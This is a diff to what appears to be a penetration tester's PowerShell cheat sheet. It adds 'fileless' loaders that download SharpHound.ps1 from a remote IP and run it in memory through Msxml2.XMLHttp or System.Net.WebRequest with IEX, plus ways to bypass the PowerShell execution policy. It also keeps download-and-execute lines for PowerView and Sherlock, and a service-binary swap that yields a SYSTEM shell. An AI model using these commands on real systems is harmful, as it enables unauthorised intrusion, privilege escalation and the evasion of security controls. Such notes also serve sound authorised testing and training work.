@@ -2,9 +2,9 @@
 
 ## Invoke-WebRequest
 ```
-c:/> Invoke-WebRequest "http://10.2.3.85/ASCService.exe" -OutFile "ASCService.exe"
-c:/> powershell -c Invoke-WebRequest "http://10.2.3.85/ASCService.exe" -OutFile "ASCService.exe"
-c:/> powershell -c start-service AdvancedSystemCareService9
+Invoke-WebRequest "http://10.2.3.85/ASCService.exe" -OutFile "ASCService.exe"
+powershell -c Invoke-WebRequest "http://10.2.3.85/ASCService.exe" -OutFile "ASCService.exe"
+powershell -c start-service AdvancedSystemCareService9
 
 WOOTWOOT
 c:\Windows\system32>whoami
@@ -37,6 +37,19 @@ IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/PowerView.ps1')
 ```
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.19:8000/Sherlock.ps1') | powershell -noprofile - 
 ```
+
+## Fileless ComObject
+```
+$h=New-Object -ComObject Msxml2.XMLHttp;$h.open('GET','http://192.168.10.1:8000/SharpHound.ps1',$false);$h.send();iex $h.responseText
+```
+
+## Fileless WinAPI
+```
+$wr = [System.NET.WebRequest]::Create("http://192.168.10.1:8000/SharpHound.ps1") 
+$r = $wr.GetResponse() 
+IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
+```
+
 
 ## Running Executable
 ```
@@ -268,6 +281,14 @@ Get-ADGroupMember -Identity 'Service Technicians' | ?{$_.ObjectClass -eq "Group"
 ## Get-ADGroup (where adminCount = 1)
 ```
 Get-ADGroup -Filter "adminCount -eq 1"
+```
+
+## Ways to Bypass Execution Policy
+```
+powershell -ExecutionPolicy bypass -NoProfile
+powershell -c <cmd>
+powershell -encodedcommand
+$env:PSExecutionPolicyPreference="bypass"
 ```
 
 ## Escape Characters
